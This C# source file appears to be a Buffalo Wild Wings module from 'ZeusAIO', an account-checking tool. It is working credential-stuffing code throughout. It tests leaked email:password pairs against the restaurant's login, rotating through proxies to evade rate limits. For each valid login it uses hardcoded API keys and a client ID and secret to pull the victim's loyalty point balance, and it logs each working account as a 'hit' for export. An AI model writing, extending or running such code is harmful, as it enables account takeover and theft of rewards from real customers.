using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace BwwChecker
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0";
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AllowAutoRedirect = false;
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string text2 = httpRequest.Post("https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyCmtykcZ6UTfD0vvJ05IpUVe94uIaUQdZ4", string.Concat(new string[]
                            {
                                "{\"email\":\"",
                                s[0],
                                "\",\"password\":\"",
                                s[1],
                                "\",\"returnSecureToken\":true}"
                            }), "application/json").ToString();
                            {
                                if (text2.Contains("idToken"))
                                {
                                    string idToken = Regex.Match(text2, "idToken\": \"(.*?)\"").Groups[1].Value;
                                    string capture = BuffaloWildWingsGetCaptures(idToken);

                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui== "2")
                                    {
                                        Console.WriteLine("[HIT - BWW] " + s[0] + ":" + s[1] + " | " + capture , Color.Green);
                                    }
                                    Export.AsResult("/Buffalo Wild Wings_hits", s[0] + ":" + s[1] + " | " + capture);
                                    return false;
                                }
                                else if (text2.Contains("invalid"))
                                {
                                    // Bad
                                    break;
                                }
                                else
                                {
                                    ZeusAIO.mainmenu.realretries++;
                                    goto Retry;
                                }
                            }
                        }
                        //break;
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }

        static string BuffaloWildWingsGetCaptures(string idToken)
        {
            while (true)
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        req.IgnoreProtocolErrors = true;
                        req.ConnectTimeout = 10000;
                        req.KeepAliveTimeout = 10000;
                        req.ReadWriteTimeout = 10000;


                        string proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                        if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                        {
                            req.Proxy = HttpProxyClient.Parse(proxy);
                        }
                        if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                        {
                            req.Proxy = Socks4ProxyClient.Parse(proxy);
                        }
                        if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                        {
                            req.Proxy = Socks5ProxyClient.Parse(proxy);
                        }

                        req.AddHeader("Content-Type", "application/json");
                        req.Authorization = $"Bearer {idToken}";
                        string strResponse = req.Post(new Uri($"https://us-central1-buffalo-united.cloudfunctions.net/getSession"), new BytesContent(Encoding.Default.GetBytes("{\"data\":{\"version\":\"6.38.44\",\"platform\":\"ios\",\"recaptchaToken\":\"none\"}}"))).ToString();

                        if (strResponse.Contains("\"AccessToken\":\""))
                        {
                            string profileId = Regex.Match(strResponse, "\"ProfileId\":\"(.*?)\"").Groups[1].Value;
                            string accessToken = Regex.Match(strResponse, "\"AccessToken\":\"(.*?)\"").Groups[1].Value;

                            req.AddHeader("Authorization", $"OAuth {accessToken}");
                            req.AddHeader("X_CLIENT_ID", "4171883342bf4b88aa4b88ec77f5702b");
                            req.AddHeader("X_CLIENT_SECRET", "786c1B856fA542C4b383F3E8Cdd36f3f");
                            string strResponse2 = req.Get(new Uri($"https://api.buffalowildwings.com/loyalty/v1/profiles/{profileId}/pointBalance?status=A")).ToString();

                            if (strResponse2.Contains("PointAmount"))
                            {
                                string pointAmount = Regex.Match(strResponse2, "\"PointAmount\":(.*?),").Groups[1].Value;

                                return $"Point Balance: {pointAmount}";
                            }
                            else if (strResponse2.Contains("403 ERROR"))
                            {
                                continue;
                            }
                        }
                    }
                }
                catch
                {
                    ZeusAIO.mainmenu.errors++;
                }
            return "";
        }

    }
}
